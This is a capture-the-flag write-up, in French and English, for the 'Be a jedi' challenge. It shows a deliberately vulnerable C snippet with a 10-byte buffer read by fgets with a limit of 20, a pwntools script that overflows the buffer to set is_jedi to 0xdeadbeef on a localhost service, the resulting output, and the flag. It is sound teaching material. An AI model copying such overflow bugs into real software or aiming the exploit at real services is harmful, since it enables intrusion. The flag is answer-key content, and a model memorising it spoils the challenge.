# Be a jedi

## Write-up FR

Le programme `jedi` est un elf x86.
Lorsque nous nous connectons au service avec netcat, il nous demande si nous sommes un Jedi. Cependant, peu importe notre réponse, elle sera toujours considérée comme fausse.

En analysant le code source, on comprend que pour afficher le flag, la variable `int is_jedi` doit être égale à `0xdeadbeef`.
On remarque également une vulnérabilité de type `buffer overflow` due à la déclaration de la variable answer : 

```c
char answer[10];
...
fgets(answer,20,stdin);
```
Bien que answer ait une taille de `10` octets, il est possible de lui fournir jusqu'à `20` caractères via `fgets()`.
Par chance, la variable `is_jedi` est située juste avant `answer` en mémoire. Cela signifie que nous pouvons écraser sa valeur en dépassant la limite du buffer et en y insérant `0xdeadbeef`.

Puisque `answer` occupe `10` octets, nous devons simplement la remplir avec `10` caractères, suivis de `0xdeadbeef` pour modifier is_jedi :

```python
#sol.py
from pwn import *

p = remote("localhost", 4445)

p.recvline()

p.sendline(b"aaaaaaaaaa\xef\xbe\xad\xde")

p.interactive()
```
Ce qui donne : 
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4445: Done
[*] Switching to interactive mode
>>> Hello jedi, this is your secret message
polycyber{y0u_r3_4_r34l_j3d1}[*] Got EOF while reading in interactive
$
```

## Write-up EN

The `jedi` program is an x86 ELF binary.
When we connect to the service using netcat, it asks whether we are a Jedi. However, no matter our response, it is always considered false.

By analyzing the source code, we understand that in order to display the flag, the variable `int is_jedi` must be set to `0xdeadbeef`.
We also notice a `buffer overflow` vulnerability in the declaration of the answer variable:
```c
char answer[10];
...
fgets(answer,20,stdin);
```
Although `answer` has a size of `10` bytes, it is possible to provide up to `20` characters via `fgets()`.
Luckily, the `is_jedi` variable is located just before `answer` in memory. This means we can overflow into `is_jedi` by writing beyond answer's buffer and setting it to `0xdeadbeef`.
```python
# sol.py
from pwn import *

p = remote("localhost", 4445)

p.recvline()

p.sendline(b"aaaaaaaaaa\xef\xbe\xad\xde")

p.interactive()
```
```bash
$ python sol.py 
[+] Opening connection to localhost on port 4445: Done
[*] Switching to interactive mode
>>> Hello Jedi, this is your secret message
polycyber{y0u_r3_4_r34l_j3d1}[*] Got EOF while reading in interactive
$
```

## Flag

`polycyber{y0u_r3_4_r34l_j3d1}`